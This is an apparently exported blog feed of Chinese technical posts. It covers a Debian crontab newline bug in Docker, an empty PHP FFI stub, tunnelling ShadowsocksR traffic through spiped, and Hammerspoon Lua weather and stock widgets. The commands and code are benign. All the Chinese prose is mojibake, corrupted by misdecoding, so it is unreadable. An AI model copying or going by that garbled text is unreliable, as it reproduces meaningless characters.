2&gt;&amp;1</span><br></pre></td></tr></table></figure></li><li><p>crontabæ”¹åŠ¨å</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">00000000: 3020 3020 2a20 2a20 2a20 2f75 7372 2f6c  0 0 * * * /usr/l</span><br><span class="line">00000010: 6f63 616c 2f62 696e 2f70 7974 686f 6e20  ocal/bin/python</span><br><span class="line">//çœç•¥...</span><br><span class="line">000000f0: 2e6c 6f67 2032 3e26 310a                 .log 2&gt;&amp;1.</span><br></pre></td></tr></table></figure><p>æ³¨æ„åˆ°æ–‡ä»¶ç»“å°¾å¤„çš„åŒºåˆ«ï¼Œæ”¹åŠ¨åå¤šäº†<code>0x0a</code>æ ‡å¿—ä¿¡æ¯å³æ–‡ä»¶æ¢è¡Œç¬¦<code>LF</code>ã€‚ç”±äºä»»åŠ¡æ–‡ä»¶æœ€åä¸€è¡Œæ²¡æœ‰æ¢è¡Œç¬¦å·å¯¼è‡´ä¸èƒ½åŠ è½½è¯¥æ¡å‘½ä»¤ã€‚</p></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//https://github.com/ushell/learncode/blob/master/crontab/debian/cron-3.0pl1/misc.c#L329</span></span><br><span class="line"><span class="comment">/* get_string(str, max, file, termstr) : like fgets() but</span></span><br><span class="line"><span class="comment"> *(1) has terminator string which should include \n</span></span><br><span class="line"><span class="comment"> *(2) will always leave room for the null</span></span><br><span class="line"><span class="comment"> *(3) uses get_char() so LineNumber will be accurate</span></span><br><span class="line"><span class="comment"> *(4) returns EOF or terminating character, whichever</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">int</span></span><br><span class="line">get_string(<span class="built_in">string</span>, size, file, terms)</span><br><span class="line"><span class="keyword">char</span>*<span class="built_in">string</span>;</span><br><span class="line"><span class="keyword">int</span>size;</span><br><span class="line">FILE*file;</span><br><span class="line"><span class="keyword">char</span>*terms;</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span>ch;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (EOF != (ch = get_char(file)) &amp;&amp; !<span class="built_in">strchr</span>(terms, ch)) &#123;</span><br><span class="line"><span class="keyword">if</span> (size &gt; <span class="number">1</span>) &#123;</span><br><span class="line">*<span class="built_in">string</span>++ = (<span class="keyword">char</span>) ch;</span><br><span class="line">size--;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (size &gt; <span class="number">0</span>)</span><br><span class="line">*<span class="built_in">string</span> = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> ch;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0x4-æ‰‹å·¥è°ƒè¯•"><a href="#0x4-æ‰‹å·¥è°ƒè¯•" class="headerlink" title="0x4.æ‰‹å·¥è°ƒè¯•"></a>0x4.æ‰‹å·¥è°ƒè¯•</h2><p>åŸºäºDebianç³»ç»Ÿçš„crontabæ²¡æœ‰æ—¥å¿—è®°å½•ï¼Œè°ƒè¯•ä»£ç æ—¶éœ€è¦æ‰“å¼€    cron.hæ–‡ä»¶ä¸­<code>DEBUGGING</code>ï¼›é‡æ–°ç¼–è¯‘åï¼Œcrontabæ‰§è¡Œæ—¶ä¼šæ‰“å°ä¸€äº›å…³é”®çš„DEBUGä¿¡æ¯æ–¹ä¾¿æ’æŸ¥ã€‚</p><p>æ³¨æ„ç¼–è¯‘åå‚æ•°-xçš„å€¼é—®é¢˜</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">ç¤ºä¾‹</span></span><br><span class="line">./cron -x ext,proc,pars,load  #å‚è€ƒcron.hä¸­çš„DebugFlags</span><br></pre></td></tr></table></figure><h2 id="0x5-æ€»ç»“"><a href="#0x5-æ€»ç»“" class="headerlink" title="0x5.æ€»ç»“"></a>0x5.æ€»ç»“</h2><p>crontabæ˜¯Linuxç¯å¢ƒä¸­æœ€å¸¸ç”¨çš„å®šæ—¶ä»»åŠ¡æ‰§è¡Œç¨‹åºï¼Œç”±äºæ“ä½œç³»ç»Ÿä¸åŒcrontabçš„å®ç°æ–¹å¼ä¹Ÿä¸ä¸€æ ·ã€‚åœ¨Dockerç¯å¢ƒä¸­ï¼ŒåŸºäºDebianç³»ç»Ÿä½¿ç”¨çš„æ˜¯<code>3.0pl1-127</code>ç‰ˆæœ¬ï¼ŒAlpineç³»ç»Ÿä¸­ä½¿ç”¨çš„busyboxç‰ˆæœ¬ã€‚å‰è€…ç¨‹åºæ¯”è¾ƒå®Œå–„ä½†æ˜¯ä¸æ”¯æŒæ—¥å¿—è®°å½•(éœ€è¦ä¿®æ”¹æºç ), åè€…æ¯”è¾ƒè½»é‡çº§æ”¯æŒå‰åå°åŠæ—¥å¿—è®°å½•ç­‰åŠŸèƒ½ã€‚</p><p>ç”±äºcrontabæœ€æ–°ä¸€ç‰ˆçš„æ›´æ–°æ˜¯2004å¹´å·¦å³ï¼ŒDebianç³»ç»Ÿæ‰“ç®—é‡‡ç”¨<code>cronie</code>ä»£æ›¿ç›®å‰crontabã€‚ä¸šåŠ¡ç³»ç»Ÿä¸­å¯ä»¥æ ¹æ®å…¶ä»–ç‰ˆæœ¬çš„å®šæ—¶ç¨‹åºä»£æ›¿ã€‚</p><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><ul><li><a href="https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=543895">bug#543895</a></li><li><a href="https://wiki.debian.org/cron">DebianCronWiki</a></li><li><a href="https://wiki.debian.org/Locale">LocaleWiki</a></li><li><a href="http://blog.chinaunix.net/uid-20682147-id-4977039.html">crontabåŸç†åˆ†æ</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> docker </category>
          
      </categories>
      
      
        <tags>
            
            <tag> docker </tag>
            
            <tag> crontab </tag>
            
            <tag> debian </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP7.4çš„æ–°åŠŸèƒ½FFI</title>
      <link href="2019/12/11/php7-4%E7%9A%84%E6%96%B0%E5%8A%9F%E8%83%BDFFI/"/>
      <url>2019/12/11/php7-4%E7%9A%84%E6%96%B0%E5%8A%9F%E8%83%BDFFI/</url>
      
        <content type="html"><![CDATA[<p>PHPåœ¨7.4ç‰ˆæœ¬æä¾›ä¸€ä¸ªæœ‰æ„æ€çš„æ‰©å±•FFI(Foreign Function Interface)ï¼Œä½¿PHPå¯ä»¥è°ƒç”¨Cè¯­è¨€çš„å‡½æ•°ï¼Œè¯¥æ‰©å±•ç”±PHPæ ¸å¿ƒå¼€å‘è€…Dmitry Stogovå¼€å‘ã€‚å…¶å®è·¨è¯­è¨€è°ƒç”¨å·²ç»å¾ˆå¸¸è§çš„éœ€æ±‚ï¼Œè™½ç„¶çœ‹ç€æ¯”è¾ƒæ€ªå¼‚ï¼Œæ›´å¤šçš„æ˜¯ä¸€ç§æŠ˜ä¸­å®ç°wrapperã€‚FFIçš„å‡ºç°é™ä½å¯¹å¼€å‘PHPæ‰©å±•çš„ä¾èµ–ï¼Œåœ¨æ­¤ä¹‹å‰å¦‚æœè°ƒç”¨æŸäº›Cè¯­è¨€ç¼–å†™çš„åº“æ—¶ï¼Œéœ€è¦ä»¥å¼€å‘PHPæ‰©å±•å½¢å¼è¿›è¡Œå°è£…ï¼›å³ä½¿æœ‰zephirè¿™æ ·çš„å·¥å…·ï¼Œä¾ç„¶å¢åŠ å­¦ä¹ æˆæœ¬ã€‚</p><h2 id="ç¤ºä¾‹"><a href="#ç¤ºä¾‹" class="headerlink" title="#ç¤ºä¾‹"></a>#ç¤ºä¾‹</h2><h2 id="ç¼ºç‚¹"><a href="#ç¼ºç‚¹" class="headerlink" title="#ç¼ºç‚¹"></a>#ç¼ºç‚¹</h2><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="#æ€»ç»“"></a>#æ€»ç»“</h2><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="#å‚è€ƒ"></a>#å‚è€ƒ</h2><ul><li><a href="https://jolicode.com/blog/php-7-4-ffi-what-you-need-to-know">PHP 7.4 FFI: What you need to know</a></li><li><a href="https://learnku.com/articles/24756">PHP 7.4 å‰ç»ï¼šFFI</a></li><li><a href="https://www.php.net/manual/zh/class.ffi.php">PHP FFIå®˜ç½‘æ–‡æ¡£</a></li><li><a href="https://github.com/dstogov/php-ffi">PHP FFIæºç </a></li><li><a href="https://wiki.php.net/rfc/ffi">PHP FFI RFC</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> php </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ffi </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSRæµé‡åŠ å¯†</title>
      <link href="2019/09/24/SSR%E6%B5%81%E9%87%8F%E5%8A%A0%E5%AF%86/"/>
      <url>2019/09/24/SSR%E6%B5%81%E9%87%8F%E5%8A%A0%E5%AF%86/</url>
      
        <content type="html"><![CDATA[<p>é…¸é…¸ä¹³æµæµªåœ¨å¤–ï¼Œæ€»ä¼šæœ‰åäººåœ¨é…¸é…¸ä¹³å›å®¶çš„è·¯ä¸Šæ—¶å¸¸æ‰“åŠ«å¥¹ã€‚è‹±å‹‡çš„ä½ åº”è¯¥å¦‚ä½•ä¿æŠ¤ä½ å®¶å¯çˆ±çš„é…¸é…¸ä¹³å‘¢ï¼Ÿçºµè§‚é­”æ³•ä¸–ç•Œï¼Œæ— å¤–ä¹åŠ å¯†æˆ–æ··æ·†ã€‚æ··æ·†ç®—æ˜¯é“é«˜ä¸€å°ºï¼Œé­”é«˜ä¸€ä¸ˆï¼›è¿˜æ˜¯é­”é«˜ä¸€å°ºï¼Œé“é«˜ä¸€ä¸ˆå‘¢ï¼ŸçœŸçœŸå‡å‡å€’ä¸å¦‚æŒ–æ¡ä¸“é—¨çš„è·¯è®©é…¸é…¸ä¹³å¯ä»¥æ„‰å¿«çš„ç©è€ï¼Œè¿™é‡Œä½¿ç”¨spipedæ–¹æ¡ˆæ¥å®ç°ã€‚</p><p>spipedæ˜¯Tarsnapé¡¹ç›®ä¸­çš„ä¸€ä¸ªåŠ å¯†é€šä¿¡å·¥å…·ï¼Œå¦å¤–è¿˜æœ‰è‘—åçš„åŠ å¯†å·¥å…·scrypt, ç›®å‰å·²å¼€æºåˆ°<a href="https://github.com/Tarsnap/spiped">åŒäººç¤¾åŒº</a>, è¯¥å·¥å…·ä½¿ç”¨AESåŠ å¯†é€šä¿¡ï¼Œæ”¯æŒsocketç«¯å£åŠ å¯†è½¬å‘ï¼Œç±»ä¼¼SSHä»£ç†ï¼Œå·¥ä½œåŸç†å‚è€ƒ<a href="https://www.tarsnap.com/spiped.html">å®˜æ–¹æ–‡æ¡£</a></p><p>æœ¬æ–‡ä¸è®¨è®ºé…¸é…¸ä¹³é…ç½®ï¼Œåªæ˜¯è®¨è®ºç»™é…¸é…¸ä¹³å¥—ä»¶è¡£æœã€‚</p><h2 id="spipedé…ç½®"><a href="#spipedé…ç½®" class="headerlink" title="#spipedé…ç½®"></a>#spipedé…ç½®</h2><ul><li><p>ä¸‹è½½æºç </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/Tarsnap/spiped.git</span><br></pre></td></tr></table></figure></li><li><p>ä¾èµ–å®‰è£…</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> OpenSSLä¾èµ– (OSXç³»ç»Ÿ)</span></span><br><span class="line">export LDFLAGS=&quot;-L /usr/local/Cellar/openssl/1.0.2r/lib&quot; CFLAGS=&quot;-I /usr/local/Cellar/openssl/1.0.2r/include&quot; </span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>ç¼–è¯‘</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make</span><br></pre></td></tr></table></figure></li><li><p>spiped</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> spipeæµ‹è¯•å·¥å…·</span></span><br><span class="line">spipe/spipe</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> spipedä¸»ç¨‹åº</span>  </span><br><span class="line">spiped/spiped </span><br></pre></td></tr></table></figure></li></ul><h2 id="é…¸é…¸ä¹³é…ç½®"><a href="#é…¸é…¸ä¹³é…ç½®" class="headerlink" title="#é…¸é…¸ä¹³é…ç½®"></a>#é…¸é…¸ä¹³é…ç½®</h2><ul><li><p>æµé‡æµé€šç¤ºä¾‹</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">æœ¬åœ°è¯·æ±‚æµé‡ -&gt; æœ¬åœ°é…¸é…¸ä¹³æœåŠ¡ -&gt; æœ¬åœ°spipedæœåŠ¡ &lt;-----&gt; æœåŠ¡å™¨spipedæœåŠ¡ -&gt; æœåŠ¡å™¨æœ¬åœ°é…¸é…¸ä¹³æœåŠ¡ -&gt; å¤–é¢çš„ä¸–ç•Œ</span><br></pre></td></tr></table></figure></li><li><p>spipedå¯†é’¥ç”Ÿæˆ</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> å¤åˆ¶è¯¥å¯†é’¥åˆ°æœåŠ¡å™¨ä¸Š</span></span><br><span class="line">dd if=/dev/urandom bs=32 count=1 &gt; secret.key</span><br></pre></td></tr></table></figure></li><li><p>spipedå®¢æˆ·ç«¯è¿è¡Œ</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">spiped -e -s &#x27;127.0.0.1:10086&#x27; -t æœåŠ¡å™¨IP:æœåŠ¡å™¨ç«¯å£ -k secret.key</span><br></pre></td></tr></table></figure></li><li><p>spipedæœåŠ¡ç«¯è¿è¡Œ</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">spiped -d -s &#x27;0.0.0.0:æœåŠ¡å™¨ç«¯å£&#x27; -t &#x27;127.0.0.1:é…¸é…¸ä¹³ç«¯å£&#x27; -k secret.key</span><br></pre></td></tr></table></figure></li><li><p>é…ç½®æœ¬åœ°é…¸é…¸ä¹³ç«¯å£</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">æœåŠ¡å™¨é…ç½®: 127.0.0.1 ç«¯å£<span class="selector-pseudo">:10086</span></span><br></pre></td></tr></table></figure></li></ul><p>æ³¨æ„: é…¸é…¸ä¹³æœåŠ¡ç«¯å°½é‡127è¿è¡Œï¼Œä¸è¦æš´éœ²åˆ°å¤–é¢ï¼›spipedæœåŠ¡ç«¯å£æš´éœ²çš„ç«¯å£å°½é‡æ˜¯å¸¸ç”¨æœåŠ¡ç«¯å£</p><p>ç¼ºç‚¹: ç”±äºç»™é…¸é…¸ä¹³å¥—äº†å±‚è¡£æœï¼Œæ‰‹æœºç«¯æ˜¯ä¸èƒ½ä½¿ç”¨çš„ï¼</p><p>åŒç±»å‹çš„æœåŠ¡è¿˜æœ‰stunnelâ€¦</p>]]></content>
      
      
      <categories>
          
          <category> network </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ssr </tag>
            
            <tag> spipe </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hammerspoonæé«˜ç”Ÿäº§åŠ›</title>
      <link href="2019/09/08/hammerspoon%E6%8F%90%E9%AB%98%E7%94%9F%E4%BA%A7%E5%8A%9B/"/>
      <url>2019/09/08/hammerspoon%E6%8F%90%E9%AB%98%E7%94%9F%E4%BA%A7%E5%8A%9B/</url>
      
        <content type="html"><![CDATA[<p>hammerspoonæ˜¯MacOSç³»ç»Ÿä¸‹ä¸€æ¬¾å®ç°è‡ªåŠ¨åŒ–çš„å·¥å…·ï¼Œé€šè¿‡luaè„šæœ¬æ‰©å±•ç³»ç»ŸåŠŸèƒ½ã€‚ç›¸æ¯”å…¶ä»–é€šè¿‡pythonè„šæœ¬ï¼Œnodejsè„šæœ¬æˆ–åŸç”Ÿçš„automator, hammerspoonæ›´åŠ ç®€å•ï¼Œæç¤ºæ¡†ç•Œé¢ç¾è§‚ã€‚ä¹Ÿå¯ä»¥ä½¿ç”¨pythonå’Œpyncåº“å®ç°ç›‘æ§é€šçŸ¥ï¼Œnodejså’Œnode-notifierç»„ä»¶å®ç°é€šçŸ¥çš„æ–¹æ¡ˆã€‚æ¯•ç«Ÿå·¥å…·çš„è‡ªåŠ¨åŒ–æ˜¯æé«˜ç”Ÿäº§åŠ›çš„å¿…è¦å› ç´ ã€‚</p><h2 id="é…ç½®"><a href="#é…ç½®" class="headerlink" title="#é…ç½®"></a>#é…ç½®</h2><p>hammerspoonå¯ä»¥ä½¿ç”¨brewå®‰è£…ï¼Œä¹Ÿå¯ä»¥ç›´æ¥åœ¨å®˜ç½‘ä¸‹è½½äºŒè¿›åˆ¶æ–‡ä»¶</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">githubä¸‹è½½é¡µé¢</span></span><br><span class="line">https://github.com/Hammerspoon/hammerspoon/releases</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">brewå®‰è£…</span></span><br><span class="line">brew install hammerspoon</span><br></pre></td></tr></table></figure><p>å®‰è£…å®Œæˆåï¼Œåœ¨<code>å¯åŠ¨å°</code>ä¸­å¯ä»¥çœ‹åˆ°å·²å®‰è£…çš„hammerspoonå›¾æ ‡, MacOSçš„èœå•æ ä¸Šä¼šæ˜¾ç¤ºä¸€ä¸ªé”¤å­å›¾æ ‡ã€‚</p><p>hammerspooné»˜è®¤é…ç½®æ–‡ä»¶æ˜¯<code>~/.hammerspoon/init.lua</code></p><p>é…ç½®æ–‡ä»¶ç›®å½•</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.hammerspoon</span></span><br><span class="line">â”œâ”€â”€ <span class="selector-tag">Spoons</span></span><br><span class="line">â”œâ”€â”€ <span class="selector-tag">init</span><span class="selector-class">.lua</span></span><br><span class="line">â””â”€â”€ <span class="selector-tag">weather</span></span><br><span class="line">    â””â”€â”€ <span class="selector-tag">weather</span><span class="selector-class">.lua</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="åŠŸèƒ½"><a href="#åŠŸèƒ½" class="headerlink" title="#åŠŸèƒ½"></a>#åŠŸèƒ½</h2><p>åœ¨hammerspoonæ–‡æ¡£ä¸­ï¼Œæ”¯æŒè¿è¡Œåº”ç”¨ã€ç”µæ± ç®¡ç†ã€windowçª—å£ç®¡ç†ã€å¯¹è¯æ¡†ã€ç½‘ç»œç®¡ç†ç­‰ç­‰åŠŸèƒ½ï¼›å…¶ä¸­hammerspoonæä¾›äº†ä¸€ä¸ªhs.httpåº“ç”¨æ¥å®ç°httpç›¸å…³è¯·æ±‚åŠŸèƒ½ã€‚</p><p>ä»¥<code>å¤©æ°”åŠŸèƒ½</code>ä¸ºç¤ºä¾‹æ¥äº†è§£hammerspoonä½¿ç”¨</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- ç¼–è¾‘weather/weather.lua</span></span><br><span class="line"><span class="comment">-- å¤©æ°”æ¥å£ä½¿ç”¨tianqiapiå…è´¹æ¥å£, éœ€è¦ç®€å•æ³¨å†Œè·å–IDåŠå¯†ç </span></span><br><span class="line"><span class="keyword">local</span> urlApi = <span class="string">&#x27;https://www.tianqiapi.com/api/?version=v1&amp;appid=ç”³è¯·ID&amp;appsecret=ç”³è¯·å¯†ç &#x27;</span></span><br><span class="line"><span class="keyword">local</span> menubar = hs.menubar.new()</span><br><span class="line"><span class="keyword">local</span> menuData = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- å¤©æ°”å›¾æ ‡</span></span><br><span class="line"><span class="keyword">local</span> weaEmoji = &#123;</span><br><span class="line">   lei = <span class="string">&#x27;â›ˆ&#x27;</span>,</span><br><span class="line">   qing = <span class="string">&#x27;â˜€ï¸&#x27;</span>,</span><br><span class="line">   shachen = <span class="string">&#x27;ğŸ˜·&#x27;</span>,</span><br><span class="line">   wu = <span class="string">&#x27;ğŸŒ«&#x27;</span>,</span><br><span class="line">   xue = <span class="string">&#x27;â„ï¸&#x27;</span>,</span><br><span class="line">   yu = <span class="string">&#x27;ğŸŒ§&#x27;</span>,</span><br><span class="line">   yujiaxue = <span class="string">&#x27;ğŸŒ¨&#x27;</span>,</span><br><span class="line">   yun = <span class="string">&#x27;â˜ï¸&#x27;</span>,</span><br><span class="line">   zhenyu = <span class="string">&#x27;ğŸŒ§&#x27;</span>,</span><br><span class="line">   yin = <span class="string">&#x27;â›…ï¸&#x27;</span>,</span><br><span class="line">   default = <span class="string">&#x27;&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">updateMenubar</span><span class="params">()</span></span></span><br><span class="line"> menubar:setTooltip(<span class="string">&quot;å¤©æ°”é¢„æŠ¥&quot;</span>)</span><br><span class="line">    menubar:setMenu(menuData)</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getWeather</span><span class="params">()</span></span></span><br><span class="line">   <span class="comment">-- è¯·æ±‚APIæ¥å£</span></span><br><span class="line">   hs.http.doAsyncRequest(urlApi, <span class="string">&quot;GET&quot;</span>, <span class="literal">nil</span>,<span class="literal">nil</span>, <span class="function"><span class="keyword">function</span><span class="params">(code, body, htable)</span></span></span><br><span class="line">      <span class="keyword">if</span> code ~= <span class="number">200</span> <span class="keyword">then</span></span><br><span class="line">         <span class="built_in">print</span>(<span class="string">&#x27;get weather error:&#x27;</span>..code)</span><br><span class="line">         <span class="keyword">return</span></span><br><span class="line">      <span class="keyword">end</span></span><br><span class="line">      rawjson = hs.json.decode(body)</span><br><span class="line">      city = rawjson.city</span><br><span class="line">      menuData = &#123;&#125;</span><br><span class="line">      <span class="comment">-- å¤„ç†æ•°æ®ï¼Œæ›´æ–°åˆ°èœå•æ é‡Œ</span></span><br><span class="line">      <span class="keyword">for</span> k, v <span class="keyword">in</span> <span class="built_in">pairs</span>(rawjson.data) <span class="keyword">do</span></span><br><span class="line">         <span class="keyword">if</span> k == <span class="number">1</span> <span class="keyword">then</span></span><br><span class="line">            menubar:setTitle(weaEmoji[v.wea_img])</span><br><span class="line">            titlestr = <span class="built_in">string</span>.<span class="built_in">format</span>(<span class="string">&quot;%s %s %s ğŸŒ¡ï¸%s ğŸ’§%s ğŸ’¨%s ğŸŒ¬ %s %s&quot;</span>, city,weaEmoji[v.wea_img],v.day, v.tem, v.humidity, v.air, v.win_speed, v.wea)</span><br><span class="line">            item = &#123; title = titlestr &#125;</span><br><span class="line">            <span class="built_in">table</span>.<span class="built_in">insert</span>(menuData, item)</span><br><span class="line">            <span class="built_in">table</span>.<span class="built_in">insert</span>(menuData, &#123;title = <span class="string">&#x27;-&#x27;</span>&#125;)</span><br><span class="line">         <span class="keyword">else</span></span><br><span class="line">            <span class="comment">-- titlestr = string.format(&quot;%s %s %s %s&quot;, v.day, v.wea, v.tem, v.win_speed)</span></span><br><span class="line">            titlestr = <span class="built_in">string</span>.<span class="built_in">format</span>(<span class="string">&quot;%s %s %s ğŸŒ¡ï¸%s ğŸŒ¬%s %s&quot;</span>, city, weaEmoji[v.wea_img],v.day, v.tem, v.win_speed, v.wea)</span><br><span class="line">            item = &#123; title = titlestr &#125;</span><br><span class="line">            <span class="built_in">table</span>.<span class="built_in">insert</span>(menuData, item)</span><br><span class="line">         <span class="keyword">end</span></span><br><span class="line">      <span class="keyword">end</span></span><br><span class="line">      updateMenubar()</span><br><span class="line">   <span class="keyword">end</span>)</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">menubar:setTitle(<span class="string">&#x27;âŒ›&#x27;</span>)</span><br><span class="line">getWeather()</span><br><span class="line">updateMenubar()</span><br><span class="line"><span class="comment">-- å®šæ—¶ä»»åŠ¡</span></span><br><span class="line">hs.timer.doEvery(<span class="number">3600</span>, getWeather)</span><br></pre></td></tr></table></figure><p>ç¤ºä¾‹äºŒï¼šå®šæ—¶è·å–è‚¡ç¥¨è¡Œæƒ…</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- ç›¸å…³ä»£ç å·²æ›´æ–°åˆ°Github</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">local</span> XQAPI = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">local</span> menubar = hs.menubar.new()</span><br><span class="line"><span class="keyword">local</span> menuData = &#123;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">local</span> stockList = <span class="string">&#x27;SH000001&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">updateMenubar</span><span class="params">()</span></span></span><br><span class="line">    menubar:setMenu(menuData)</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getStock</span><span class="params">(fisrt)</span></span></span><br><span class="line">fisrt = fisrt <span class="keyword">or</span> <span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- è¯·æ±‚æœåŠ¡</span></span><br><span class="line">api = <span class="built_in">string</span>.<span class="built_in">format</span>(<span class="string">&quot;%s/?symbol=%s&quot;</span>, XQAPI, stockList)</span><br><span class="line">hs.http.doAsyncRequest(api, <span class="string">&quot;GET&quot;</span>, <span class="literal">nil</span>, headers, <span class="function"><span class="keyword">function</span><span class="params">(code, body, htable)</span></span></span><br><span class="line">  <span class="keyword">if</span> code ~= <span class="number">200</span> 